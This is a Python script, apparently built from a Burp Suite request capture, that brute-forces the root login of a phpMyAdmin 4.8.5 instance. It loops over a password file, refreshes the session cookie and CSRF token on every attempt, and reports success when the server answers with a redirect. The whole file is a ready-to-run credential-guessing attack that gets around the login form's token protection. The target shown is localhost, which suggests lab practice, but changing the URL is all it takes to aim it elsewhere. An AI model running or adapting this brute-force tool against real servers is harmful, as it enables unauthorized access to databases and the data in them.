import requests
import re
burp0_url = "http://localhost:80/phpMyAdmin4.8.5/index.php"
burp0_cookies = {"pma_lang": "zh_CN", "phpMyAdmin": "775l4niljpfmsn51rm2a6aqdlo"}
burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "Origin": "null", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = {"set_session": "775l4niljpfmsn51rm2a6aqdlo", "pma_username": "root", "pma_password": "rot", "server": "1", "target": "index.php", "token": "-#0|2}sRZVz7&],~"}

r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False)

def find_token(html_text):
    pattern = r'token:"([^"]*)"'
    match = re.search(pattern, html_text)
    if match:
        token = match.group(1)
        return token
    else:
        return None

def get_cookie(header):
    return header[11:37]

payload = []
with open("password.txt","r") as f:
    for i in f.read().splitlines():
        payload.append(i)

for i in payload:
    for j in range(5):
        burp0_cookies['phpMyAdmin'] = get_cookie(r.headers['Set-Cookie'])
        burp0_data['set_session'] = get_cookie(r.headers['Set-Cookie'])
        burp0_data['token'] = find_token(r.text)
        burp0_data['pma_password'] = i
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False)
        if r.status_code == 302:
            print("password: ",i)